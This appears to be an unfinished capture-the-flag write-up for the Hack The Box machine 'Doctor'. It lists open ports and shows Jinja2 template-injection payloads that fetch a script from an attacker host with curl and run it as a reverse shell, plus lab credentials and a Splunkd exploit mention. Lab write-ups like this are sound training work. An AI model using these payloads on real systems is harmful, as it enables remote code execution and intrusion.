Name & IP Address of Machine:
> # DOCTOR : `10.10.10.209`
**Table Of Contents:**
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
    - [Opened Ports:](#opened-ports)
- [FootHold](#foothold)
- [- Splunkd exploit using pysplunkdremote.py using creds of shaun.](#--splunkd-exploit-using-pysplunkdremotepy-using-creds-of-shaun)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

## Synopsis
  
---

## Enumeration

---
#### Opened Ports: 
- [ ] 22 (SSH)
- [ ] 80 (Apache HTTP)
- [ ] 8089 (Splunkd)

---

## FootHold
- On port 80, a simple HTML blog was there, which reveals the hostname `doctors.htb`.
- SSTI on doctors.htb
```payload
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl http://10.10.14.8:8000/rev.sh -o /dev/shm/rev.sh').read()}}
{{config.__class__.__init__.__globals__['os'].popen('bash /dev/shm/rev.sh').read()}}
```
- User discoverd: `shaun:Guitar123`
`User web is groups of adm that means we can read logs` Interesting!!! `- /reset_password?email=Guitar123`
- Splunkd exploit using pysplunkdremote.py using creds of shaun.
---

## Lateral Movement

---

## Privilege Escalation

---